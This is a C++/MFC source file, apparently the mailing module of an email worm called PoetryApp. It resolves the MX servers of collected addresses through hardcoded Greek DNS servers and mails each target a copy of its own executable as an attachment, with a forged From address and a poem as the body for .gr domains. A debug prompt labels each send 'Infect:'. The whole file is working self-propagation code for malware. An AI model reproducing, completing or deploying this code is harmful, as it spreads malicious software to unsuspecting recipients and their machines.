   // SendMessage.cpp : implementation file
   //

   #include "stdafx.h"
   #include "SendMessage.h"
   #include "PoetryApp.h"
   #include "MainFrm.h"
   #include "DNSResolverLibrary/nameser.h"
   #include "DNSResolverLibrary/resolv.h"

   #include "smtp\smtp.h"
   #include "smtp\MIMEMessage.h"


   #ifdef _DEBUG
   #define new DEBUG_NEW
   #undef THIS_FILE
   static char THIS_FILE[] = __FILE__;
   #endif

   /////////////////////////////////////////////////////////////////////////////
   // CSendMessage

   IMPLEMENT_DYNCREATE(CSendMessage, CWinThread)

   CSendMessage::CSendMessage()
   {

   }

   CSendMessage::~CSendMessage()
   {
   }

   BOOL CSendMessage::InitInstance()
   {
       // TODO:  perform and per-thread initialization here
       return TRUE;
   }

   int CSendMessage::ExitInstance()
   {
       // TODO:  perform any per-thread cleanup here
       return CWinThread::ExitInstance();
   }

   BEGIN_MESSAGE_MAP(CSendMessage, CWinThread)
       //{{AFX_MSG_MAP(CSendMessage)
       //}}AFX_MSG_MAP
   END_MESSAGE_MAP()

   /////////////////////////////////////////////////////////////////////////////
   // CSendMessage message handlers

   void CSendMessage::AddEmail(CEmailAdr Email)
   {
       //_asm {
       //int 3;
       //}

       int s=m_Emails.GetSize();
       for(int i=0;i<s;i++)
           if(m_Emails[i]==Email) return;

       m_Emails.Add(Email);

       //...
       //PostThreadMessage(WUM_EMAILADDED,0,0);


       return;
   }

   void CSendMessage::OnEmailAdded()
   {
       //Check for unsent messages.
       //quit if none found
       //if(m_Emails.GetSize()==0) return;
       for(int i=0;i<m_Emails.GetSize();i++)
           if (m_Emails[i].m_Posted==false)
           {
               CEmailAdr Mail=m_Emails[i];

               //Use DNS lookup to get the mail server of this Email
               CString mailservers;
               //ns1.otenet.gr  195.170.0.2
               //ns2.otenet.gr  195.170.0.1
               //ns1.hol.gr  194.30.220.119
               //teiresias.forthnet.gr 194.219.227.2

               GetSMTPServer("195.170.0.2,194.30.220.119,194.219.227.2",Mail.m_Domain,mailservers);

               if(mailservers=="")
                   mailservers=Mail.m_Domain;

               if(mailservers.Find(',')!=-1)
               {
                   mailservers=mailservers.Mid(0,mailservers.Find(','));
               }
               Mail.m_MailServer=mailservers;

               SendMail(Mail);

               m_Emails[i].m_Posted=true;
           }

       return;
   }


   int CSendMessage::GetSMTPServer(CString DNSAddress, CString DomainName, CString &SMTPAddress)
   {
       //Resolve(BDomainName, &vFoundNames, _bstr_t("C_IN"), _bstr_t("T_MX"));
       //Resolve(BSTR BSearchedName, VARIANT *pvFoundNames, BSTR BResourceClass, BSTR BResourceType)

       HRESULT hReturnCode = FALSE; // Failure
       union {
           HEADER hdr;
           u_char buf[PACKETSZ];
       } oDNSAnswer;
       int nDNSAnswerLength;
       int nResourceClass;
       int nResourceType;
       CString szSearchedName;
       CString szFoundNames;
       CString m_szServerAddresses;

       // Convert parameters and init output
       nResourceClass = (int)C_IN;
       nResourceType = T_MX;

       szSearchedName = DomainName;
       if (szSearchedName == "") return false;

       m_szServerAddresses=DNSAddress;
       if (m_szServerAddresses== "") return false;


       BOOL bNoServer = TRUE;
       CStringList oServerList;
       CString szServerAddress;
       res_init();
       BuildListFromString(m_szServerAddresses, oServerList);
       POSITION pServer = oServerList.GetHeadPosition();
       while (pServer != NULL) {
           szServerAddress = oServerList.GetNext(pServer);
           // Convert dotted notation into address
           struct in_addr addr;
           if (inet_aton(szServerAddress, &addr))
           {
               // Store it in configuration (memory)
               res_addnameserver(&addr);
               bNoServer = FALSE;
           }
       }
       if (bNoServer) {
           CString szErrorMessage = "Invalid DNS server addresses \"";
           szErrorMessage+=m_szServerAddresses;
           return false;
       }

       // Send query to DNS Server and fetch reply
       nDNSAnswerLength = res_search(szSearchedName, nResourceClass, nResourceType, (u_char *)&oDNSAnswer, sizeof(oDNSAnswer));
       if (nDNSAnswerLength == -1) {
           DWORD dwLastError = GetLastError();
           if (dwLastError == 0) {
               dwLastError = ERROR_UNEXP_NET_ERR;
           }
           //SetError("DNS Resolution failure: ", dwLastError);
           hReturnCode = HRESULT_FROM_WIN32(dwLastError);
       } else {

           if (oDNSAnswer.hdr.rcode != NOERROR) {

               DWORD dwLastError = GetLastError();
               if (dwLastError == 0) {
                   dwLastError = ERROR_UNEXP_NET_ERR;
               }
               //SetError("DNS Resolution failure: ", dwLastError);
               hReturnCode = HRESULT_FROM_WIN32(dwLastError);

           } else {

               // Set pointers for parsing answers
               u_char *cp = oDNSAnswer.buf + HFIXEDSZ;
               u_char *pEndOfMessage = oDNSAnswer.buf + nDNSAnswerLength;

               // Number of answers
               int nAnswers = ntohs(oDNSAnswer.hdr.ancount);
               TRACE1("Number of answers = %d\n", nAnswers);

               // Authoritative answer
               BOOL bAuthoritative = (oDNSAnswer.hdr.aa?TRUE:FALSE);

               // Skip the question section
               cp += SkipName(oDNSAnswer.buf, cp, pEndOfMessage) + QFIXEDSZ;

               // Extract Data (and skip it)
               u_short nType;
               u_short nClass;
               u_int32_t nTimeToLive;
               u_short nDataLength;
               struct in_addr inaddr;
               u_char *pCurrentData = NULL;

               cp += SkipData(oDNSAnswer.buf, cp, &nType, &nClass, &nTimeToLive, &nDataLength, pEndOfMessage);

               while (nAnswers-->=0 && cp<pEndOfMessage) {
                   pCurrentData = cp;

                   // Check of type of data is the requested type: if yes, process it (otherwise: ignore it)
                   TRACE1("RR Type %d...\n", nType);

                   // Get type specific data, if appropriate

                   switch (nType) {
                   case T_A:
                       {
                           // IPv4 address
                           switch (nClass) {
                           case C_IN:
                           case C_HS:
                               bcopy(pCurrentData, (char *)&inaddr, INADDRSZ);
                               if (nDataLength == 4) {
                                   TRACE("internet address = %s\n", inet_ntoa(inaddr));

                                   AppendResult(nResourceType, nType, inet_ntoa(inaddr), szFoundNames);

                               } else if (nDataLength == 7) {
                                   TRACE("\tinternet address = %s",
                                       inet_ntoa(inaddr));
                                   TRACE(", protocol = %d", pCurrentData[4]);
                                   TRACE(", port = %d\n",
                                       (pCurrentData[5] << 8) + pCurrentData[6]);

                                   AppendResult(nResourceType, nType, inet_ntoa(inaddr), szFoundNames);

                                   // TODO: return protocol and port
                               }
                               break;
                           default:
                               TRACE("\taddress, class = %d, len = %d\n",
                                   nClass, nDataLength);
                               // TODO: handle unknown class for type T_A
                           }
                           pCurrentData+=nDataLength;
                       }
                       break;

                   case T_MX:
                       {
                           // Mail eXchanger
                           TRACE("\tpreference = %u",getshort((u_char*)pCurrentData));
                           pCurrentData += INT16SZ;
                           TRACE("\tmail exchanger = \"%s\"\n", pCurrentData);
                           int n;
                           char name[MAXDNAME];

                           n = dn_expand(oDNSAnswer.buf, pEndOfMessage, pCurrentData, name, sizeof(name));
                           if (n >= 0) {
                               AppendResult(nResourceType, nType, name, szFoundNames);
                               pCurrentData+=n;
                           }
                       }
                       break;

                   case T_CNAME:
                       TRACE("\tcanonical name = \"");
                       {
                           int n;
                           char name[MAXDNAME];

                           n = dn_expand(oDNSAnswer.buf, pEndOfMessage, pCurrentData, name, sizeof(name));
                           if (n >= 0) {
                               TRACE("%s", name);
                               AppendResult(nResourceType, nType, name, szFoundNames);
                               pCurrentData+=n;
                           }
                       }
                       TRACE("\"\n");
                       break;

                   case T_NS:
                       TRACE("\tnameserver = \"");
                       {
                           int n;
                           char name[MAXDNAME];

                           n = dn_expand(oDNSAnswer.buf, pEndOfMessage, pCurrentData, name, sizeof(name));
                           if (n >= 0) {
                               AppendResult(nResourceType, nType, name, szFoundNames);
                               pCurrentData+=n;
                           }
                       }
                       TRACE("\"\n");
                       break;

                   case T_PTR:
                       TRACE("\tname = \"");
                       {
                           int n;
                           char name[MAXDNAME];

                           n = dn_expand(oDNSAnswer.buf, pEndOfMessage, pCurrentData, name, sizeof(name));
                           if (n >= 0) {
                               AppendResult(nResourceType, nType, name, szFoundNames);
                               pCurrentData+=n;
                           }
                       }
                       TRACE("\"\n");
                       break;

                   case T_MG:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_MB:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_MR:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_NAPTR:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_SRV:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_RT:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_AFSDB:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_HINFO:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_ISDN:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_SOA:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_MINFO:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_RP:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_TXT:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_X25:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_NSAP:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_AAAA:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_UINFO:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_UID:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_GID:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_WKS:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   case T_NULL:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;

                   default:
                       // TODO: handle this type
                       pCurrentData+=nDataLength;
                       break;
                   }

                   ////////////////
                   // Next answer
                   ////////////////

                   // skip the name
                   pCurrentData += SkipName(oDNSAnswer.buf, pCurrentData, pEndOfMessage);
                   // extract the type, class, TTL and data length of next answer
                   GETSHORT(nType, pCurrentData);
                   GETSHORT(nClass, pCurrentData);
                   GETLONG(nTimeToLive, pCurrentData);
                   GETSHORT(nDataLength, pCurrentData);
                   cp = pCurrentData;

               }

               hReturnCode = S_OK;
           }
       }

       SMTPAddress=szFoundNames;

       return hReturnCode;
   }

   BOOL CSendMessage::BuildListFromString(LPCTSTR lpszStringWithSeparators, CStringList &oList)
   {
       CString szStringWithSeparators = lpszStringWithSeparators;
       TCHAR cSeparator = ',';
       int nPos = -1;
       oList.RemoveAll();
       int nCurrentPos = 0;
       int nCurrentLength = 0;
       CString szCurrentItem;

       nPos = szStringWithSeparators.Find(cSeparator);
       if (nPos == -1) {
           // Try semi-colon
           cSeparator = ';';
           nPos = szStringWithSeparators.Find(cSeparator);
           if (nPos == -1) {
               // Try space
               cSeparator = ' ';
               nPos = szStringWithSeparators.Find(cSeparator);
           }
       }
       while (nPos != -1) {
           nCurrentLength = nPos - nCurrentPos;
           szCurrentItem = szStringWithSeparators.Mid(nCurrentPos, nCurrentLength);
           // Remove starting/trailing spaces
           szCurrentItem.TrimLeft(" ");
           szCurrentItem.TrimRight(" ");
           if (szCurrentItem != "") {
               TRACE1("Adding string \"%s\"\n", szCurrentItem);
               oList.AddTail(szCurrentItem);
           }
           nCurrentPos = nPos+1;
           nPos = szStringWithSeparators.Find(cSeparator, nCurrentPos);
       }
       // Add last item
       szCurrentItem = szStringWithSeparators.Mid(nCurrentPos);
       // Remove starting/trailing spaces
       szCurrentItem.TrimLeft(" ");
       szCurrentItem.TrimRight(" ");
       if (szCurrentItem != "") {
           TRACE1("Adding string \"%s\"\n", szCurrentItem);
           oList.AddTail(szCurrentItem);
       }


       return(!oList.IsEmpty());
   }

   int CSendMessage::SkipData(u_char *pStartOfMesssage, u_char *pCurrentPosition, u_short *pType, u_short *pClass, u_int32_t *pTimeToLive, u_short *pDataLength, u_char *pEndOfMessage)
   {
       u_char *pTempPosition = pCurrentPosition;
       // Skip the data name
       pTempPosition += SkipName(pStartOfMesssage, pTempPosition, pEndOfMessage);

       // Get the Type, Class, TTL and Data Length
       GETSHORT(*pType, pTempPosition);
       GETSHORT(*pClass, pTempPosition);
       GETLONG(*pTimeToLive, pTempPosition);
       GETSHORT(*pDataLength, pTempPosition);

       return(pTempPosition - pCurrentPosition);
   }

   int CSendMessage::SkipName(u_char *pStartOfMesssage, u_char *pCurrentPosition, u_char *pEndOfMessage)
   {
       char buf[MAXDNAME];
       int n;

       n = dn_expand(pStartOfMesssage, pEndOfMessage, pCurrentPosition, buf, MAXDNAME);
       if (n<0)
       {
           n=0;
       }

       return(n);
   }

   BOOL CSendMessage::AppendResult(int nRequestedType, int nType, LPCTSTR lpszResult, CString &szTotalResult)
   {

       if (nType == nRequestedType || nRequestedType == T_ANY) {
           if (szTotalResult == "") {
               szTotalResult = lpszResult;
           } else {
               // Append name (using separator property to separate entries)
               szTotalResult +=",";
               szTotalResult += lpszResult;
           }
       }
       return(TRUE);
   }

   bool CSendMessage::SendMail(CEmailAdr Mail)
   {
       #ifdef _DEBUG
       if(AfxMessageBox(CString("Infect:")+Mail.m_UserName+CString("@")+Mail.m_Domain,MB_OKCANCEL |MB_DEFBUTTON2     |MB_ICONSTOP   )!=IDOK)
       {
           return false;
       }
       #endif

       TRY
       {

       if(FromEmail=="")
       {
           FromEmail="admin@"+Mail.m_Domain;
           Mail.m_Subject="";
       }


       CMIMEMessage msg;

       msg.m_sFrom = FromEmail;

       FromEmail=Mail.m_UserName+"@"+Mail.m_Domain;

       msg.m_sSubject = Mail.m_Subject;

       msg.AddMultipleRecipients(Mail.m_UserName+"@"+Mail.m_Domain);

       if(Mail.m_Domain.Right(3)==".gr")
           msg.m_sBody=theApp.Poetry;
       else
           msg.m_sBody=" ";

       CString Filename=__targv[0];
       msg.AddMIMEPart(Filename);

       CSMTP smtp( Mail.m_MailServer );
       smtp.Connect();
       smtp.SendMailMessage(&msg);

       smtp.Disconnect();

       }
       CATCH(CMemoryException, e)
       {
           //duh!
           delete e;
       }
       AND_CATCH(CException, e)
       {
           delete e;
       }
       END_CATCH

       return true;
   }

   BOOL CSendMessage::PreTranslateMessage(MSG* pMsg)
   {
       // TODO: Add your specpialized code here and/or call the base class
       BOOL ret= CWinThread::PreTranslateMessage(pMsg);
       return ret;
   }

   BOOL CSendMessage::OnIdle(LONG lCount)
   {
       OnEmailAdded();

       CWinThread::OnIdle(lCount);
       return 1;
   }
